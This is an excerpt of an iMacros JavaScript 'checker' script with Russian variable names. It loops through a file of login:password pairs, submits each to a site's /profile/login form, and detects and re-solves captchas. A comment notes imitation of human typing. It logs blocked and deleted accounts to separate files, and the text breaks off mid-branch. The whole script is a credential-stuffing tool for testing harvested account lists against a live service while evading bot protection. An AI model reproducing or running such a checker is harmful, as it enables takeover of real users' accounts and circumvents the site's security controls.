var capErr=0; var start = new Date(); 
...
function stata(статусАкка) {iimDisplay(статусАкка+"\n текущий акк № "+номерСтроки+"\nлогин:пароль = "+логин+":"+пароль+timming())}
////задаем № тек.аккка;
...
login:
for(i=номерСтроки;i<1000;i++)
 {	//LOGIN;PASS:
	iimSet('номерСтроки',номерСтроки);
	iimPlayCode('SET !REPLAYSPEED fast\nCMDLINE !DATASOURCE C:\\чекер\\акки.txt\nSET !DATASOURCE_LINE {{номерСтроки}}\nset !extract {{!COL1}}\n add !extract {{!COL2}}'); var логин=iimGetLastExtract(1); var пароль=iimGetLastExtract(2);
	
	iimSet("пароль",пароль);iimSet("логин",логин); 
...
'==следующие 4 строки юзались для иммитации человеческого ввода::
	...
	if((копиБоди().search( /с картинки/i )!=-1)||(копиБоди().search( /код/i )!=-1)) //ищем капчу
	{	cap6:
		for(g=0;g<10;g++)
	...
	ONDOWNLOAD FOLDER="C:\\" FILE=cap.jpg WAIT=YES
	    ...
	    iimPlayCode('TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/profile/login ATTR=*\n wait seconds=1')
		if(копиБоди().search( /код/i )!=-1) {capErr++; stata("=!!!F**CK!--; монстр ошибся уже "+capErr+" раз!;"); iimSet('логин',логин); iimPlayCode('TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/profile/login ATTR=NAME:password CONTENT={{логин}}'); continue cap6} //переразгадывать;
		else {var g=10};
		}
	}else{iimPlayCode('TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/profile/login ATTR=*\n wait seconds=1')
		  if(копиБоди().search( /код/i )!=-1) {stata("неверная капча!!!F**CK!--; "); continue login} //переразгадывать;
		 }
	if(копиБоди().search( /заблокирован/i )!=-1)  //акк заблочен;
		{stata("АКК ЗАБЛОЧЕН!");		
		iimSet("логин",логин);iimSet("пароль",пароль);
		iimPlayCode('SET !EXTRACT {{логин}}:{{пароль}}\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=заблоченные.txt')
		count();}
	else { if((копиБоди().search( /Неверная электронная/i )!=-1)||(копиБоди().search( /ваш пароль/i )!=-1))  //акк удален;
			{stata("АКК УДАЛЕН");
			iimSet("логин",логин);iimSet("пароль",пароль);
			iimPlayCode('SET !EXTRACT {{логин}}:{{пароль}}\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=удаленные.txt')
			count();}
		  else { if(копиБоди().search( /Сообщения/i )!=-1)
